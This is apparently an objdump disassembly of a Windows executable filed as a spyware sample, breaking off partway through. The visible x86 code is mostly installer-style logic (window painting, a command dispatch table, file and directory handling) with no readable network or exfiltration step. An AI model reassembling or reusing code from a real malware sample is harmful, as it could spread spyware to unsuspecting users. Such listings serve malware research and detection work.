
malware_samples/spyware/ab28d13695ace992307fb1aaea7144f977d5b6562acec1f465c9c0a9fa04190c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 9a 42 00    	mov    0x429a68,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 70 9a 42 00    	mov    0x429a70,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 8a 42 00       	push   $0x428a60
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 9a 42 00       	mov    0x429a88,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 88 9a 42 00    	mov    0x429a88,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c 9a 42 00    	cmp    0x429a8c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c 9a 42 00    	cmp    0x429a8c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 9a 42 00       	mov    0x429a88,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c 9a 42 00    	cmp    %esi,0x429a8c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c 9a 42 00    	mov    0x429a8c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 a0 42 00       	mov    $0x42a000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 b6 52 00 00       	call   0x40663c
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 9a 42 00    	mov    0x429a90,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c 8a 42 00    	add    %eax,0x428a4c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 8a 42 00    	push   0x428a34
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c 8a 42 00    	push   0x428a4c
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 f8 ad 40 00       	push   $0x40adf8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 30 43 00 00       	call   0x405761
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 68 9a 42 00       	mov    0x429a68,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 a0 42 00       	mov    $0x42a000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 54 ce 40 00    	mov    %ecx,0x40ce54
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 cc 17 00 00    	ja     0x402c56
  40148a:	ff 24 8d 68 2c 40 00 	jmp    *0x402c68(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 c9 42 00 00       	call   0x405761
  401498:	e9 2c 0f 00 00       	jmp    0x4023c9
  40149d:	ff 05 2c 8a 42 00    	incl   0x428a2c
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 1d 0f 00 00    	je     0x4023c9
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 11 0f 00 00       	jmp    0x4023c9
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 96 17 00 00       	jmp    0x402c61
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 8f 42 00 00       	call   0x405761
  4014d2:	e9 7f 17 00 00       	jmp    0x402c56
  4014d7:	53                   	push   %ebx
  4014d8:	e8 d3 18 00 00       	call   0x402db0
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 61 17 00 00       	jmp    0x402c56
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 53 17 00 00       	jmp    0x402c56
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 39                	jg     0x401541
  401508:	7d 0e                	jge    0x401518
  40150a:	8b 04 85 e0 9a 42 00 	mov    0x429ae0(,%eax,4),%eax
  401511:	a3 5c ce 40 00       	mov    %eax,0x40ce5c
  401516:	eb 0f                	jmp    0x401527
  401518:	c1 e0 02             	shl    $0x2,%eax
  40151b:	8b 88 e0 9a 42 00    	mov    0x429ae0(%eax),%ecx
  401521:	89 88 40 9b 42 00    	mov    %ecx,0x429b40(%eax)
  401527:	6a 01                	push   $0x1
  401529:	e8 82 18 00 00       	call   0x402db0
  40152e:	59                   	pop    %ecx
  40152f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401532:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401535:	89 04 8d e0 9a 42 00 	mov    %eax,0x429ae0(,%ecx,4)
  40153c:	e9 15 17 00 00       	jmp    0x402c56
  401541:	c1 e0 02             	shl    $0x2,%eax
  401544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401547:	8d 88 e0 9a 42 00    	lea    0x429ae0(%eax),%ecx
  40154d:	8b 80 40 9b 42 00    	mov    0x429b40(%eax),%eax
  401553:	89 01                	mov    %eax,(%ecx)
  401555:	0f 8d fb 16 00 00    	jge    0x402c56
  40155b:	a1 5c ce 40 00       	mov    0x40ce5c,%eax
  401560:	89 01                	mov    %eax,(%ecx)
  401562:	e9 ef 16 00 00       	jmp    0x402c56
  401567:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40156a:	8d 34 85 e0 9a 42 00 	lea    0x429ae0(,%eax,4),%esi
  401571:	33 c0                	xor    %eax,%eax
  401573:	8b 0e                	mov    (%esi),%ecx
  401575:	3b cb                	cmp    %ebx,%ecx
  401577:	0f 94 c0             	sete   %al
  40157a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40157d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401581:	89 0e                	mov    %ecx,(%esi)
  401583:	e9 d9 16 00 00       	jmp    0x402c61
  401588:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40158b:	ff 34 85 e0 9a 42 00 	push   0x429ae0(,%eax,4)
  401592:	57                   	push   %edi
  401593:	e9 38 16 00 00       	jmp    0x402bd0
  401598:	8b 0d 30 8a 42 00    	mov    0x428a30,%ecx
  40159e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4015a4:	3b cb                	cmp    %ebx,%ecx
  4015a6:	74 09                	je     0x4015b1
  4015a8:	ff 75 d4             	push   -0x2c(%ebp)
  4015ab:	51                   	push   %ecx
  4015ac:	ff d6                	call   *%esi
  4015ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4015b1:	8b 0d 44 8a 42 00    	mov    0x428a44,%ecx
  4015b7:	3b cb                	cmp    %ebx,%ecx
  4015b9:	0f 84 97 16 00 00    	je     0x402c56
  4015bf:	50                   	push   %eax
  4015c0:	51                   	push   %ecx
  4015c1:	ff d6                	call   *%esi
  4015c3:	e9 8e 16 00 00       	jmp    0x402c56
  4015c8:	6a f0                	push   $0xfffffff0
  4015ca:	e8 03 18 00 00       	call   0x402dd2
  4015cf:	ff 75 d4             	push   -0x2c(%ebp)
  4015d2:	50                   	push   %eax
  4015d3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015d9:	85 c0                	test   %eax,%eax
  4015db:	0f 85 75 16 00 00    	jne    0x402c56
  4015e1:	e9 74 13 00 00       	jmp    0x40295a
  4015e6:	6a f0                	push   $0xfffffff0
  4015e8:	e8 e5 17 00 00       	call   0x402dd2
  4015ed:	50                   	push   %eax
  4015ee:	89 45 08             	mov    %eax,0x8(%ebp)
  4015f1:	e8 60 4a 00 00       	call   0x406056
  4015f6:	8b f0                	mov    %eax,%esi
  4015f8:	3b f3                	cmp    %ebx,%esi
  4015fa:	74 61                	je     0x40165d
  4015fc:	6a 5c                	push   $0x5c
  4015fe:	56                   	push   %esi
  4015ff:	e8 d4 49 00 00       	call   0x405fd8
  401604:	8b f0                	mov    %eax,%esi
  401606:	66 8b 3e             	mov    (%esi),%di
  401609:	66 89 1e             	mov    %bx,(%esi)
  40160c:	66 3b fb             	cmp    %bx,%di
  40160f:	75 1f                	jne    0x401630
  401611:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401614:	74 1a                	je     0x401630
  401616:	e8 8c 46 00 00       	call   0x405ca7
  40161b:	85 c0                	test   %eax,%eax
  40161d:	74 11                	je     0x401630
  40161f:	ff 75 08             	push   0x8(%ebp)
  401622:	e8 09 46 00 00       	call   0x405c30
  401627:	3b c3                	cmp    %ebx,%eax
  401629:	74 28                	je     0x401653
  40162b:	ff 45 fc             	incl   -0x4(%ebp)
  40162e:	eb 08                	jmp    0x401638
  401630:	ff 75 08             	push   0x8(%ebp)
  401633:	e8 52 46 00 00       	call   0x405c8a
  401638:	3b c3                	cmp    %ebx,%eax
  40163a:	74 17                	je     0x401653
  40163c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401641:	75 0d                	jne    0x401650
  401643:	ff 75 08             	push   0x8(%ebp)
  401646:	ff 15 dc 80 40 00    	call   *0x4080dc
  40164c:	a8 10                	test   $0x10,%al
  40164e:	75 03                	jne    0x401653
  401650:	ff 45 fc             	incl   -0x4(%ebp)
  401653:	66 89 3e             	mov    %di,(%esi)
  401656:	46                   	inc    %esi
  401657:	46                   	inc    %esi
  401658:	66 3b fb             	cmp    %bx,%di
  40165b:	75 9f                	jne    0x4015fc
  40165d:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401660:	74 2d                	je     0x40168f
  401662:	6a e6                	push   $0xffffffe6
  401664:	e8 ba fd ff ff       	call   0x401423
  401669:	ff 75 08             	push   0x8(%ebp)
  40166c:	68 00 50 43 00       	push   $0x435000
  401671:	e8 66 50 00 00       	call   0x4066dc
  401676:	ff 75 08             	push   0x8(%ebp)
  401679:	ff 15 e0 80 40 00    	call   *0x4080e0
  40167f:	85 c0                	test   %eax,%eax
  401681:	0f 85 cf 15 00 00    	jne    0x402c56
  401687:	ff 45 fc             	incl   -0x4(%ebp)
  40168a:	e9 c7 15 00 00       	jmp    0x402c56
  40168f:	6a f5                	push   $0xfffffff5
  401691:	e9 87 0c 00 00       	jmp    0x40231d
  401696:	53                   	push   %ebx
  401697:	e8 36 17 00 00       	call   0x402dd2
  40169c:	50                   	push   %eax
  40169d:	e8 97 53 00 00       	call   0x406a39
  4016a2:	e9 ad 06 00 00       	jmp    0x401d54
  4016a7:	6a d0                	push   $0xffffffd0
  4016a9:	e8 24 17 00 00       	call   0x402dd2
  4016ae:	6a df                	push   $0xffffffdf
  4016b0:	8b f0                	mov    %eax,%esi
  4016b2:	e8 1b 17 00 00       	call   0x402dd2
  4016b7:	6a 13                	push   $0x13
  4016b9:	8b f8                	mov    %eax,%edi
  4016bb:	e8 12 17 00 00       	call   0x402dd2
  4016c0:	57                   	push   %edi
  4016c1:	56                   	push   %esi
  4016c2:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016c8:	85 c0                	test   %eax,%eax
  4016ca:	74 07                	je     0x4016d3
  4016cc:	6a e3                	push   $0xffffffe3
